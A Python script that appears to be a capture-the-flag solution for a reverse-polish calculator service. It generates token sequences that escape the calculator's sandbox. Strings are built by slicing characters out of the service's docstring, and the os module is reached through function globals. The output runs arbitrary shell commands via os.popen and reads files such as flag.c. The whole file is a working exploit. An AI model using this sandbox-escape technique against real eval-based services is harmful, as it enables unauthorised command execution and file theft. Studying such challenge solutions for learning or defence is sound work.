#!/usr/bin/env python
# -*- coding: utf-8 -*-

DOC_STRING =     """
+-------------------------------------------------------------------------+
| This is a calculator that takes expressions in reverse polish notation. |
|                                                                         |
| In reverse polish notation the operands precede the operators. Unlike   |
| conventional infix notation every statement is unambiguous so no        |
| parenthesis are required.                                               |
|                                                                         |
| Here are some examples of how to use it:                                |
| 1 1 add             -> (1 + 1)                                          |
| 1 1 add 5 multiply  -> (1 + 1) * 5                                      |
|                                                                         |
| Here are the operators available to you.                                |
| add      - addition                                                     |
| subtract - subtraction                                                  |
| multiply - multiplication                                               |
| divide   - standard division                                            |
| idivide  - integer division                                             |
| power    - exponentiation                                               |
| xor      - standard exclusive-or function                               |
| wumbo    - standard wumbo function                                      |
|                                                                         |
| the quick brown fox jumps over the lazy dog                             |
| THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG                             |
| 1234567890~!@#$%^&*()_+-=[]{}\|:;"'?/>.<,     ¯\_(ツ)_/¯                |
+_________________________________________________________________________+
"""
PRIMITIVES = """
1) get char: {x} {x}+1 __doc__.__getslice__
2) get string s=s1..sn: {s1} {s2} ... {sn} add
3) pop first in stack via get: {stack_first} {stack_second} wumbo.im_func.func_globals.get
3) get sys module onto stack: 'sys' 1 wumbo.im_func.func_globals.get
4) save module: {module_attr_name} {module} __setattr__
5) get os module onto stack: 'os' 1 {sys_attr}.modules.get
6) run command: {command} 'r' o.popen
7) get ouput (assuming fd = 3): 3 20000 o.read
8) read file: {file_name} 0 o.open 10000 o.read
"""

def generate_string_tokens(string_to_gen):
    global DOC_STRING
    # special case of ''
    if len(string_to_gen) == 0:
        return ['1', '1', '__doc__.__getslice__']
    string_gen_tokens = []
    for ch in string_to_gen:
        # slice in corresponding place of doc string
        ch_index = DOC_STRING.find(ch)
        string_gen_tokens += [str(ch_index), str(ch_index + 1), '__doc__.__getslice__']
    # add to a string
    string_gen_tokens += ['add'] * (len(string_to_gen) - 1)
    return string_gen_tokens

def generate_common_exploit_tokens():
    # see PRIMITIVES for explanation
    sys_module_to_stack = generate_string_tokens('sys') + ['1', 'wumbo.im_func.func_globals.get']
    sys_to_attr_none_to_stack = generate_string_tokens('s') + sys_module_to_stack + ['__setattr__']
    os_module_to_stack = generate_string_tokens('os') + sys_to_attr_none_to_stack + ['s.modules.get']
    os_to_attr_none_to_stack = generate_string_tokens('o') + os_module_to_stack + ['__setattr__']
    return os_to_attr_none_to_stack

def generate_read_file_exploit_expr(file_name):
    # see PRIMITIVES for explanation
    os_to_attr_none_to_stack = generate_common_exploit_tokens()
    file_name_to_stack = os_to_attr_none_to_stack + generate_string_tokens(file_name) + ['s.modules.get']
    open_file_fd_to_stack = file_name_to_stack + ['0', 'o.open'] # read only
    # assuming 10000 is more than enough data to read
    read_file_contents_to_stack = open_file_fd_to_stack + ['10000', 'o.read']
    final_expr = ' '.join(read_file_contents_to_stack)
    return final_expr

def generate_command_exploit_expr(command):
    # see PRIMITIVES for explanation
    os_to_attr_none_to_stack = generate_common_exploit_tokens()
    command_to_stack = os_to_attr_none_to_stack + generate_string_tokens(command) + ['s.modules.get']
    run_command_pipe_to_stack = command_to_stack + generate_string_tokens('r') + ['o.popen']
    # assuming opened fd is 3, and 20000 is more than enough data to read
    read_command_pipe_output_to_stack = run_command_pipe_to_stack + ['3', '20000', 'o.read', 's.modules.get']
    final_expr = ' '.join(read_command_pipe_output_to_stack)
    return final_expr

def main():
    print
    print 'ls . command expr: ' + generate_command_exploit_expr('ls .') 
    print
    print 'flag.c read expr: ' + generate_read_file_exploit_expr('flag.c') 

if __name__ == '__main__':
    main()

